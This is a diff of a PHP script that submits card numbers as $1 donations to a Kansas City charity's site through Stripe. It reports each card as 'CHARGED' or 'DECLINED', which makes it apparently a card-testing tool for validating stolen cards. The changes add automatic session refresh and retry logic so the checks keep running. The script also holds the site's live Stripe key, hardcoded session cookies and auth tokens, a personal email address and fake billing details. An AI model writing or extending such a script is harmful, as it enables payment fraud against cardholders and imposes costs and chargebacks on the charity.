@@ -44,17 +44,67 @@ if (strlen($expYear) == 2) {
     $expYear = '20' . $expYear;
 }
 
+// Initialize cookie jar for session continuity
+$cookieJar = tempnam(sys_get_temp_dir(), 'cookies');
+
+// Function to refresh session cookies
+function refreshSessionCookies($cookieJar) {
+    $authHeaders = [
+        'authority: www.onamissionkc.org',
+        'accept: application/json',
+        'accept-encoding: gzip, deflate, br, zstd',
+        'accept-language: en-US,en;q=0.9',
+        'content-type: application/json',
+        'origin: https://www.onamissionkc.org',
+        'referer: https://www.onamissionkc.org/login',
+        'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
+        'sec-ch-ua-mobile: ?1',
+        'sec-ch-ua-model: "Nexus 5"',
+        'sec-ch-ua-platform: "Android"',
+        'sec-ch-ua-platform-version: "6.0"',
+        'sec-fetch-dest: empty',
+        'sec-fetch-mode: cors',
+        'sec-fetch-site: same-origin',
+        'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
+    ];
+
+    // Replace with actual authentication endpoint and payload
+    $authData = json_encode([
+        'email' => 'grogeh@gmail.com',
+        'password' => 'your_password_here', // Replace with actual credentials or token
+    ]);
+
+    $ch = curl_init('https://www.onamissionkc.org/api/login'); // Replace with actual login endpoint
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $authHeaders);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $authData);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
+    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+    $response = curl_exec($ch);
+    $result = json_decode($response, true);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($httpCode != 200 || !isset($result['success'])) {
+        error_log("Failed to refresh session: " . ($result['error']['message'] ?? 'Unknown error'));
+        return false;
+    }
+
+    return true;
+}
+
 // Function to fetch a new cart token
-function fetchCartToken() {
+function fetchCartToken($cookieJar) {
     $cartHeaders = [
         'authority: www.onamissionkc.org',
         'accept: application/json',
         'accept-encoding: gzip, deflate, br, zstd',
         'accept-language: en-US,en;q=0.9',
         'content-type: application/json',
-        'cookie: crumb=BYRbHlJxSO4PZjU2MDU5YzlmYjc1MWZjNjkxY2M0NTIwNDdkNmUx; CART=tJR2kxhb_HZMnBeUPbTBQ32JZnpEv7UhNOuyOOVe; hasCart=true; __stripe_mid=fc26ede9-6f69-4fd8-b4f7-386dae9c5244177313; ss_cvr=63714000-1d58-4121-806c-904836745ca5|1761152654269|1761152654269|1761154790175|2; ss_cvt=1761154790175; __stripe_sid=6160dc1b-41b8-44ca-8ca2-0d290f1b1bd56b2330; SiteUserSecureAuthToken=MXw5ZmFkYjU5Ny05ODA0LTRhN2ItOGVlNy00ZGVkNDk1MjMyOGZ8UTlneXVXQ2xUanlULWl1U2sxTmdaTHBpZ3U4QnloYkItRDIxQnA4bFZXYVlNSlNwNXlVaHhOSVYxSy1Kd0ZzbQ; SiteUserInfo=%7B%22authenticated%22%3Atrue%2C%22lastAuthenticatedOn%22%3A%222025-10-22T18%3A06%3A23.771Z%22%2C%22siteUserId%22%3A%2268f90ebd9b1f1d028af94072%22%2C%22firstName%22%3A%22Rocky%22%7D; siteUserCrumb=Y8IivSjWX4camqD0znkkk9qNeyZNI4YiENbz-_oda6FvZGKnqVefr68NMWci2RoIBVVWXDcii4C8RSjxNWdbLNssugrOcWCg57MhmMEUYxSY2NEp3-Jm3gcclnX6rJn0',
         'origin: https://www.onamissionkc.org',
-        'priority: u=1, i',
         'referer: https://www.onamissionkc.org/donate-now',
         'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
         'sec-ch-ua-mobile: ?1',
@@ -82,6 +132,8 @@ function fetchCartToken() {
     curl_setopt($ch, CURLOPT_POSTFIELDS, $cartData);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
+    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
+    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
     $cartResponse = curl_exec($ch);
     $cartResult = json_decode($cartResponse, true);
@@ -95,7 +147,6 @@ function fetchCartToken() {
         exit;
     }
 
-    // Extract cart token from redirectUrlPath
     preg_match('/cartToken=([^&]+)/', $cartResult['redirectUrlPath'], $matches);
     if (!isset($matches[1])) {
         error_log("Failed to extract cart token from redirectUrlPath");
@@ -123,7 +174,7 @@ $headers = [
     'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
 ];
 
-$data =  'billing_details[address][city]=Oakford&billing_details[address][country]=US&billing_details[address][line1]=Siles+Avenue&billing_details[address][line2]=&billing_details[address][postal_code]=19053&billing_details[address][state]=PA&billing_details[name]=Geroge+Washintonne&billing_details[email]=grogeh%40gmail.com&type=card&card[number]=' . $cardNumber . '&card[cvc]=' . $cvc . '&card[exp_year]=' . $expYear . '&card[exp_month]=' . $expMonth . '&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=145592&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep';
+$data = 'billing_details[address][city]=Oakford&billing_details[address][country]=US&billing_details[address][line1]=Siles+Avenue&billing_details[address][line2]=&billing_details[address][postal_code]=19053&billing_details[address][state]=PA&billing_details[name]=Geroge+Washintonne&billing_details[email]=grogeh%40gmail.com&type=card&card[number]=' . $cardNumber . '&card[cvc]=' . $cvc . '&card[exp_year]=' . $expYear . '&card[exp_month]=' . $expMonth . '&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F5445b56991%3B+stripe-js-v3%2F5445b56991%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.onamissionkc.org&time_on_page=145592&client_attribution_metadata[client_session_id]=22e7d0ec-db3e-4724-98d2-a1985fc4472a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=7904f40e-9588-48b2-bc6b-fb88e0ef71d5&guid=18f2ab46-3a90-48da-9a6e-2db7d67a3b1de3eadd&muid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48&sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67&key=pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e&_stripe_account=acct_1LwocDFHMGxIu0Ep';
 
 $ch = curl_init('https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_POST, 1);
@@ -146,13 +197,7 @@ if ($httpCode != 200 || !isset($apx['id'])) {
 $pid = $apx["id"];
 
 // Function to make merchant API call
-function makeMerchantApiCall($cartToken, $pid) {
-    $cookies =  'crumb=BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1; ' .
-         'ss_cvr=b5544939-8b08-4377-bd39-dfc7822c1376|1760724937850|1760724937850|1760724937850|1; ' .
-         'ss_cvt=1760724937850; ' .
-         '__stripe_mid=3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48; ' .
-         '__stripe_sid=9d45db81-2d1e-436a-b832-acc8b6abac4814eb67';
-    
+function makeMerchantApiCall($cartToken, $pid, $cookieJar) {
     $headers = [
         'authority: www.onamissionkc.org',
         'accept: application/json, text/plain, */*',
@@ -224,7 +269,8 @@ function makeMerchantApiCall($cartToken, $pid) {
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
     curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
-    curl_setopt($ch, CURLOPT_COOKIE, $cookies);
+    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieJar);
+    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieJar);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
@@ -236,20 +282,19 @@ function makeMerchantApiCall($cartToken, $pid) {
     return ['response' => $result, 'httpCode' => $httpCode];
 }
 
-// Initial cart token fetch
-$cartToken = fetchCartToken();
-
-// Attempt merchant API call with retry on CART_ALREADY_PURCHASED or CART_MISSING
+// Attempt merchant API call with retry on errors
 $maxRetries = 3;
 $retryCount = 0;
+$cartToken = fetchCartToken($cookieJar);
 
 while ($retryCount < $maxRetries) {
-    $merchantResult = makeMerchantApiCall($cartToken, $pid);
+    $merchantResult = makeMerchantApiCall($cartToken, $pid, $cookieJar);
     $apx1 = $merchantResult['response'];
     $httpCode = $merchantResult['httpCode'];
 
     if ($httpCode == 200 && !isset($apx1['failureType'])) {
         // Success
+        unlink($cookieJar); // Clean up cookie file
         echo json_encode([
             'status' => 'CHARGED',
             'message' => 'Charged $1 successfully',
@@ -258,15 +303,29 @@ while ($retryCount < $maxRetries) {
         exit;
     }
 
-    // Check for CART_ALREADY_PURCHASED or CART_MISSING
-    if (isset($apx1['failureType']) && in_array($apx1['failureType'], ['CART_ALREADY_PURCHASED', 'CART_MISSING'])) {
-        error_log("Cart error: {$apx1['failureType']}, retrying with new cart token");
-        $cartToken = fetchCartToken();
+    // Handle specific errors
+    if (isset($apx1['failureType']) && in_array($apx1['failureType'], ['CART_ALREADY_PURCHASED', 'CART_MISSING', 'STALE_USER_SESSION'])) {
+        error_log("Error: {$apx1['failureType']}, retrying...");
+        if ($apx1['failureType'] == 'STALE_USER_SESSION') {
+            // Refresh session cookies
+            if (!refreshSessionCookies($cookieJar)) {
+                unlink($cookieJar);
+                echo json_encode([
+                    'status' => 'ERROR',
+                    'message' => 'Unable to refresh user session',
+                    'response' => 'SESSION_REFRESH_FAILED'
+                ]);
+                exit;
+            }
+        }
+        // Fetch new cart token for cart-related errors or after session refresh
+        $cartToken = fetchCartToken($cookieJar);
         $retryCount++;
         continue;
     }
 
     // Other failures
+    unlink($cookieJar);
     $errorMsg = $apx1['failureType'] ?? 'Unknown error';
     echo json_encode([
         'status' => 'DECLINED',
@@ -277,10 +336,11 @@ while ($retryCount < $maxRetries) {
 }
 
 // Max retries reached
-error_log("Max retries reached for cart token errors");
+unlink($cookieJar);
+error_log("Max retries reached for errors");
 echo json_encode([
     'status' => 'ERROR',
-    'message' => 'Unable to process payment due to persistent cart errors',
+    'message' => 'Unable to process payment due to persistent errors',
     'response' => 'MAX_RETRIES_EXCEEDED'
 ]);
 ?>
